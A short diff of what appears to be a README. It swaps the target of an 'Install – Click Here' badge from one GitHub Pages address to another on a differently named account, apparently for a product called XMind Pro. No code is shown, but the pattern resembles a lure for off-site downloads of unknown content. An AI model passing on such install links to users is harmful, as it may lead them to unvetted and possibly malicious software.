@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Install](https://img.shields.io/badge/Install-Click%20Here-white?style=for-the-badge&logo=github&logoColor=black&labelColor=white&color=black)](https://jinver-fribman.github.io/.github/xmindpro)
+[![Install](https://img.shields.io/badge/Install-Click%20Here-white?style=for-the-badge&logo=github&logoColor=black&labelColor=white&color=black)](https://pindeflux-sri-pzh.github.io/.github/mindpro)
 
 </p>
 
